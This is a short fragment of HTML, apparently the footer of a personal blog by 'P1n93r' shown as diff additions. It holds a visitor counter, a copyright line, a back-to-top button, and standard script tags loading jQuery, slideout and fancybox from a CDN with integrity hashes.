+<span id=busuanzi_container_site_uv>本站总访客数 <span id=busuanzi_value_site_uv><img src=/img/spinner.svg alt=spinner.svg></span> 人</span></div><span class=copyright-year>&copy;
+2019 -
+2022<span class=heart><i class="iconfont icon-heart"></i></span><span>P1n93r</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
+<script type=text/javascript src=/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js></script></body></html>
